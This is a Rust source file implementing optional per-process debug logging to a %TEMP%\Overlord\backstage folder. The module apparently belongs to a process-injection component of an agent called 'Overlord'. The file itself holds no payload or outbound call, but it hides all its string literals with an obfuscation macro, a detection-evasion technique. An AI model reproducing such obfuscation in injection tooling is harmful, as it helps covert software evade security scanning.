//! Optional debug logging to `%TEMP%\Overlord\backstage\BackstageInjection-debug-<pid>.log`.
//!
//! Enabled when the `BackstageInjectionDebug` environment variable is `1` (the
//! agent sets it with `BACKSTAGE_DEBUG_LOG`). Logging is best-effort: any
//! failure is swallowed and never affects redirection or injection behavior.
//! Multi-process append uses FILE_APPEND_DATA so per-pid files stay separate;
//! threads serialize on a process-wide mutex.

use core::ffi::c_void;
use core::fmt;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::{Mutex, OnceLock};

use crate::abi;
use crate::{obf16};

static DEBUG_ENABLED: AtomicBool = AtomicBool::new(false);
static LOG_HANDLE: OnceLock<Mutex<Option<usize>>> = OnceLock::new();

pub fn init_from_env() {
    let name = obf16!(b"BackstageInjectionDebug");
    let mut buf = [0u16; 8];
    unsafe {
        let len = abi::GetEnvironmentVariableW(name.as_ptr(), buf.as_mut_ptr(), buf.len() as u32);
        let enabled = len == 1 && buf[0] == 0x0031; // '1'
        DEBUG_ENABLED.store(enabled, Ordering::SeqCst);
    }
}

pub fn display_wide(wide: &[u16]) -> String {
    let trimmed = if wide.iter().rposition(|&c| c != 0).is_some() {
        let end = wide.iter().rposition(|&c| c != 0).unwrap() + 1;
        &wide[..end]
    } else {
        &wide[..0]
    };
    String::from_utf16_lossy(trimmed)
}

pub fn log(args: fmt::Arguments<'_>) {
    if !DEBUG_ENABLED.load(Ordering::SeqCst) {
        return;
    }
    let handle = open_once();
    if handle == abi::INVALID_HANDLE_VALUE {
        return;
    }

    use core::fmt::Write as _;
    let mut s = String::new();
    let _ = s.write_fmt(args);
    let mut line: Vec<u16> = s.encode_utf16().collect();
    line.push(b'\r' as u16);
    line.push(b'\n' as u16);
    unsafe {
        let mut written = 0u32;
        let _ = abi::WriteFile(
            handle,
            line.as_ptr() as *const c_void,
            (line.len() * 2) as u32,
            &mut written,
            core::ptr::null_mut(),
        );
    }
}

#[macro_export]
macro_rules! dbg_log {
    ($($arg:tt)*) => {
        $crate::log::log(format_args!($($arg)*))
    };
}

fn open_once() -> usize {
    let lock = LOG_HANDLE.get_or_init(|| Mutex::new(None));
    let mut guard = lock.lock().unwrap_or_else(|poison| poison.into_inner());
    if guard.is_none() {
        *guard = open_log();
    }
    guard.unwrap_or(abi::INVALID_HANDLE_VALUE)
}

fn open_log() -> Option<usize> {
    let (base, dir, file) = log_paths()?;

    unsafe {
        abi::CreateDirectoryW(base.as_ptr(), core::ptr::null_mut());
        abi::CreateDirectoryW(dir.as_ptr(), core::ptr::null_mut());
    }

    unsafe {
        let handle = abi::CreateFileW(
            file.as_ptr(),
            abi::FILE_APPEND_DATA,
            abi::FILE_SHARE_READ | abi::FILE_SHARE_WRITE | abi::FILE_SHARE_DELETE,
            core::ptr::null_mut(),
            abi::OPEN_ALWAYS,
            0x80, // FILE_ATTRIBUTE_NORMAL
            0,
        );
        (handle != abi::INVALID_HANDLE_VALUE).then_some(handle)
    }
}

fn log_paths() -> Option<(Vec<u16>, Vec<u16>, Vec<u16>)> {
    let env_name = obf16!(b"TEMP");
    let mut temp = [0u16; 32768];
    unsafe {
        let len = abi::GetEnvironmentVariableW(env_name.as_ptr(), temp.as_mut_ptr(), temp.len() as u32);
        if len == 0 || len >= temp.len() as u32 {
            return None;
        }
        let prefix = &temp[..len as usize];
        let base = concat_z(prefix, &obf16!(b"\\Overlord"));
        let dir = concat_z(prefix, &obf16!(b"\\Overlord\\backstage"));
        let pid = abi::GetCurrentProcessId();
        let mut file = prefix.to_vec();
        file.extend_from_slice(&obf16!(b"\\Overlord\\backstage\\BackstageInjection-debug-"));
        append_pid(&mut file, pid);
        file.extend_from_slice(&obf16!(b".log"));
        file.push(0);
        Some((base, dir, file))
    }
}

fn concat_z(prefix: &[u16], suffix: &[u16]) -> Vec<u16> {
    let mut v = Vec::with_capacity(prefix.len() + suffix.len() + 1);
    v.extend_from_slice(prefix);
    v.extend_from_slice(suffix);
    v.push(0);
    v
}

fn append_pid(v: &mut Vec<u16>, mut pid: u32) {
    if pid == 0 {
        v.push(0x0030); // '0'
        return;
    }
    let mut digits = [0u16; 10];
    let mut n = 0;
    while pid > 0 {
        digits[n] = 0x0030 + (pid % 10) as u16;
        pid /= 10;
        n += 1;
    }
    while n > 0 {
        n -= 1;
        v.push(digits[n]);
    }
}